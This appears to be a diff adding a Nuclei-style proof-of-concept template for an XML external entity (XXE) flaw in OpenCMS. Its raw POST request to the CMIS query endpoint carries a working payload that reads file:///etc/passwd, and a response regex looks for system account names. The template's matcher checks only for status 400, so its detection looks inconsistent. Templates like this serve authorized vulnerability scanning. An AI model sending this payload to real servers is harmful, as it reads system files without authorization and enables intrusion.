@@ -1,0 +1,45 @@
+id: poc-bgo3atwa3z5xgudt
+info:
+  name: OpenCMS XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bgo3atwa3z5xgudt'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bgo3atwa3z5xgudt
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /opencms/cmisatom/cmis-online/query HTTP/1.1
+
+
+    Content-Type: application/cmisquery+xml
+
+
+    Connection: close
+
+
+
+
+    <?xml version=''1.0'' encoding=''UTF-8''?><!DOCTYPE root [<!ENTITY test SYSTEM ''file:///etc/passwd''>]><cmis:query xmlns:cmis="<http://docs.oasis-open.org/ns/cmis/core/200908/>"><cmis:statement>&test;</cmis:statement><cmis:searchAllVersions>false</cmis:searchAllVersions><cmis:includeAllowableActions>false</cmis:includeAllowableActions><cmis:includeRelationships>none</cmis:includeRelationships><cmis:renditionFilter>cmis:none</cmis:renditionFilter><cmis:maxItems>100</cmis:maxItems><cmis:skipCount>0</cmis:skipCount></cmis:query>
+
+
+    # 响应代码特征
+
+    400
+
+
+    # 响应内容特征
+
+    ^(?=.*?root)(?=.*?bin).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 400
+    type: status
